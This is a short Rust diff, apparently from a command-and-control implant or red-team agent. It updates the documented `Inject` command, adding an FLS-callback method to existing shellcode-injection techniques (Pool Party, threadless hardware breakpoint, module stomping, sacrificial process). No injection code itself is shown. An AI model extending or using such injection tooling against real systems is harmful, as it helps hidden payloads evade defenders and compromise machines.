@@ -268,8 +268,10 @@ pub enum Command {
     GetUid,
     /// Inject shellcode into a target process. `method` selects the technique
     /// (0 = Pool Party thread-pool / section-backed, 1 = threadless HWBP, 2 =
-    /// module stomp). `pid` is the target process (0 = spawn a sacrificial
-    /// process instead, using `spawn_to`). `shellcode` is the raw payload.
+    /// module stomp, 3 = FLS callback — the target's own FlsAlloc registers
+    /// the payload, fired by a thread-exit rundown). `pid` is the target
+    /// process (0 = spawn a sacrificial process instead, using `spawn_to`).
+    /// `shellcode` is the raw payload.
     Inject {
         method: u8,
         pid: u32,
